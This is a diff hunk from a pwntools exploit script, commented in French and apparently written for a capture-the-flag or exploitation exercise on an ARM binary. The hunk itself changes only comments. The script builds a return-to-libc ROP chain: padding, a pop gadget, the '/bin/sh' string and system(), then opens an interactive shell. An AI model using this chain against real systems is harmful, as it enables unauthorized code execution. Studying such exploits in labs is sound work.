@@ -31,7 +31,7 @@ payload += b"A" * 0xc              # Padding jusqu'au saved PC
 payload += p32(gadget)             # Gadget: pop {r0, r4, pc}
 payload += p32(next(libc.search(b"/bin/sh")))  # r0 = "/bin/sh" (arg system)
 payload += p32(0xdeadbeef)         # r4 = valeur quelconque
-payload += p32(libc.sym["system"]) # pc = system() - exécute le shell
+payload += p32(libc.sym["system"]) # pc = system() - exécute shell
 
 io.sendline(payload)
-io.interactive()  # Obtient un shell
+io.interactive()  
